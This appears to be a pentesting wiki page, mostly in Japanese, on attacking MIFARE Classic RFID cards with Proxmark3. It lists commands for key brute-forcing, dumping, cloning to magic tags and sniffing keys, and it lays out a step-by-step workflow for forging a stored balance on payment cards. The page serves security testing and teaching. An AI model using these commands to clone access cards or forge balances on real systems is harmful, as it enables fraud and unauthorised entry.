# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3によるRFID Systemsへの攻撃

actively maintainedなRRG/Iceman Proxmark3 clientと対応するfirmwareをインストールし、そのbuildでcommand syntaxを確認してください。以下に示す古いcommandsは変更されている可能性があります。<sup>[[1]](#references)[[5]](#references)</sup>

### MIFARE Classic 1KBへの攻撃

MIFARE Classic 1Kには**16 sectors**があり、各sectorは**16 bytes**の**4 blocks**で構成されています。Manufacturer block 0にはUID/manufacturer dataが含まれており、本物のNXP cardsではread-onlyです。special cloneまたは「magic」cardsでは、これを書き換えられる場合があります。<sup>[[1]](#references)[[2]](#references)</sup>\
各sectorにaccessするには**2 keys**（**A**と**B**）が必要で、これらは各sectorの**block 3**（sector trailer）に保存されています。sector trailerには、2 keysを使って**各blockのreadおよびwrite** permissionsを決定する**access bits**も保存されています。\
例えば、最初のkeyを知っている場合はread、2つ目のkeyを知っている場合はwriteするpermissionsを与えるために、2 keysが役立ちます。

Several attacks can be performed
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3では、機密データを見つけるために、**TagからReaderへの通信をeavesdropping**するなど、ほかの操作も実行できます。このカードでは、**使用されている暗号処理が脆弱**であり、平文と暗号文が分かれば使用されたキーを計算できる（`mfkey64` tool）ため、通信をsniffしてキーを計算できます。<sup>[[3]](#references)</sup>

#### MiFare Classicのstored-value abuseにおける簡易workflow

端末がClassicカードに残高を保存する場合、一般的なエンドツーエンドのflowは次のとおりです。<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
メモ

- `hf mf autopwn` は nested/darkside/HardNested-style attacks を orchestrate し、keys を復元して、client dumps folder に dumps を作成します。<sup>[[1]](#references)</sup>
- block 0/UID の書き込みは、magic gen1a/gen2 cards でのみ機能します。Normal Classic cards の UID は read-only です。<sup>[[2]](#references)</sup>
- 多くの deployment では Classic の "value blocks" または単純な checksums が使用されています。編集後は、重複フィールドや補完フィールド、および checksums の整合性をすべて確認してください。<sup>[[4]](#references)</sup>

より高レベルの methodology と mitigations については、以下を参照してください。

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

IoT systems では、**nonbranded または noncommercial tags** が使用されることがあります。この場合、Proxmark3 を使用して **tags に custom raw commands** を送信できます。
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quitting Search
```
この情報を使えば、カードに関する情報や、カードとの通信方法について検索できます。Proxmark3では、次のように raw コマンドを送信できます: `hf 14a raw -p -b 7 26`

### スクリプト

Proxmark3 software には、簡単なタスクを実行するために使用できる **automation scripts** の一覧があらかじめ用意されています。完全な一覧を取得するには、`script list` コマンドを使用します。次に、スクリプト名を続けて `script run` コマンドを使用します:
```
proxmark3> script run mfkeys
```
タグリーダーを **fuzz** する script を作成できます。**valid card** のデータをコピーしたら、**Lua script** で1つ以上のランダムな **bytes** を **randomize** し、いずれかの反復で **reader がクラッシュ** するか確認するだけです。

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [MIFARE Classic Crypto1 に関する NXP の声明](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [KioSoft Stored Value における NFC カードの脆弱性悪用（SEC Consult）](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux インストール](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
